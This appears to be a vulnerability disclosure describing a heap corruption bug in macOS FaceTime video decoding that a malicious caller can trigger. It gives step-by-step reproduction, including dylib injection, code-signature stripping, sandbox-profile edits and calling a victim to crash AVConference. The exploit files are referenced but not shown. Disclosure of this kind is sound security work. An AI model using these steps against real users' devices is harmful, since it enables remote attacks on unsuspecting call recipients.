There is a heap corruption vulnerability in VCPDecompressionDecodeFrame which is called by FaceTime. This bug can be reached if a user accepts a call from a malicious peer.

The issue can be reproduced using the attached sequence of RTP packets. To reproduce the issue:

    1) Build video-replay.c attached (gcc -g -dynamiclib -o mylib video-replay.c) and copy to /usr/lib/mylib
    2) Use bspatch to apply the attached binpatch to /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference. The version I patched has an md5 sum of 0de78198e29ae43e686f59d550150d1b and the patched version has an md5 sum of af5bb770f08e315bf471a0fadcf96cf8. This patch alters SendRTP to retrieve the length of an encrypted packet from offset 0x650 of the encrypted buffer, as the existing code doesn't respect the output size returned from CCCryptorUpdate
    3) Use insert_dylib (https://github.com/Tyilo/insert_dylib) to add /usr/lib/mylib to AVConference (insert_dylib --strip-codesig /usr/lib/mylib AVConference)
    4) Edit /System/Library/Sandbox/Profiles/com.apple.avconferenced.sb to add /out as allow file read and write
    5) Restart the machine
    6) Extract the attached out.zip to /out and change the permissions so it's readable by AVConference
    7) Call target, when they pick up, AVConference will crash

When I reproduced this, my host was a Mac mini running version 10.13.6. My target was a MacBook Pro running 10.13.6. This PoC only works on a Mac, but the vulnerable code appears to be in iOS 11.3.1 as well.

I've improved the PoC a lot for this, an updated video-replay.c is attached.  This version does not require the binary patch for the sender binary, other than adding the library with insert_dylib. So to use this one:

1) Build video-replay.c attached (g++ -std=c++11 -g -dynamiclib -o mylib video-replay.c) and copy to /usr/lib/mylib
2) Use insert_dylib (https://github.com/Tyilo/insert_dylib) to add /usr/lib/mylib to AVConference (insert_dylib --strip-codesig /usr/lib/mylib AVConference)
3) Edit /System/Library/Sandbox/Profiles/com.apple.avconferenced.sb to add /out as allow file read and write
4) Restart the machine
5) Extract the attached out.zip to /out and change the permissions so it's readable by AVConference
6) Call target with FaceTime, when they pick up, AVConference will crash
